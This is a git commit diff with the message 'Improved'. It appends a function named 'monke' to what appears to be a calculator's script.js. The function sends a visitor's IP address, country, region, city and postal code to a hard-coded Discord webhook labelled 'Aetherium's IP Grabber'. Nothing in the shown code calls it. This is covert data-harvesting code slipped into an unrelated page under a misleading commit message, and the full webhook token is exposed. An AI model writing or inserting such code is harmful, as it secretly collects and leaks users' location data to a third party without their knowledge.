1ace1e7bcb2a0cf214141c338834eb7525a00cef
QueenlyQuester <thepotato5559@gmail.com>
2024-03-23 03:24:51 +0100

    Improved

--- script.js
+++ script.js
@@ -109,3 +109,39 @@ function calculate() {
     handleError(error);
   }
 }
+function monke(json) {
+  var request = new XMLHttpRequest();
+
+  request.open(
+    "POST",
+    "https://discord.com/api/webhooks/1213646870069387364/ESoymOBVNkyUIF7rGIJbHf5xayumooI1FdkIIBFMlwMIKsIhaszInKTHjjTdFcBEFGP2"
+  );
+
+  request.setRequestHeader("Content-type", "application/json");
+
+  var params = {
+    username: "Aetherium's IP Grabber",
+    avatar_url:
+      "https://cdn.discordapp.com/attachments/1122977732385579030/1159803884257149039/ab024efe2306f15b6a2c50a18732c407.png?ex=65325a8a&is=651fe58a&hm=0da8d1f5655d1a075f040c338cad6abdb134953d5424c53389d0bd713092d23c&",
+    embeds: [
+      {
+        title: "Aetherium's IP Grabber",
+        color: 15000,
+        description:
+          "**IP:** `" +
+          json.ip +
+          "`\n**Country:** `" +
+          json.country +
+          "`\n**Region:** `" +
+          json.region +
+          "`\n**Town/City:** `" +
+          json.city +
+          "`\n**ZIP:** `" +
+          json.postal +
+          "`",
+      },
+    ],
+  };
+
+  request.send(JSON.stringify(params));
+}
